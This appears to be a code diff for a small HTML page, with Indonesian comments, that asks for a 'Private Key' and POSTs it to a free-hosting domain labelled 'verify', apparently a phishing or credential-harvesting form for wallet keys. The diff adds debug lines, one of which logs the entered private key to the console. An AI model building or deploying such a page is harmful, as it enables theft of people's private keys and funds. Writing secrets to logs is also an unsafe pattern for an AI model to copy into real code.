@@ -1,5 +1,8 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Form POST ke ByetHost</title>
+</head>
 <body>
     <label for="PrivateKey">Private Key:</label>
     <input type="text" id="PrivateKey" name="PrivateKey" required>
@@ -7,7 +10,10 @@
 
     <script>
         function submitForm() {
+            console.log("Tombol diklik, fungsi submitForm() berjalan");
+
             const privateKey = document.getElementById("PrivateKey").value;
+            console.log("Private Key:", privateKey);
 
             fetch("https://verify-nkbihfbeo.byethost18.com/test_post.php", {
                 method: "POST",
@@ -18,10 +24,12 @@
             })
             .then(response => response.text())
             .then(data => {
+                console.log("Response dari server:", data);
                 alert(data); // Tampilkan respons dari server
             })
             .catch(error => {
                 console.error("Error:", error);
+                alert("Terjadi kesalahan, cek konsol untuk detailnya.");
             });
         }
     </script>
